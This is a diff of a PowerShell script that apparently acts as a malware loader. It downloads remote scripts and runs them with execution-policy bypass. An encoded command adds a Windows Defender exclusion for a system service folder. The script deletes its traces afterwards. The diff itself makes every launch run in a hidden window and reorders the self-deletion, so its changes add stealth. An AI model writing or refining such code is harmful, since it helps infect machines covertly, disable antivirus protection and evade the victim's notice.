@@ -29,7 +29,7 @@ $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
 iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
 iwr -Uri $initFinde -OutFile $initFindePath
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initFindePath" -Wait
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
 
 
 
@@ -83,8 +83,8 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
 
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\$main'" -Wait
-Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceFwdmonPath -basePath '$basePath\$main'" -Wait
+Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"
 
-Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
+Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
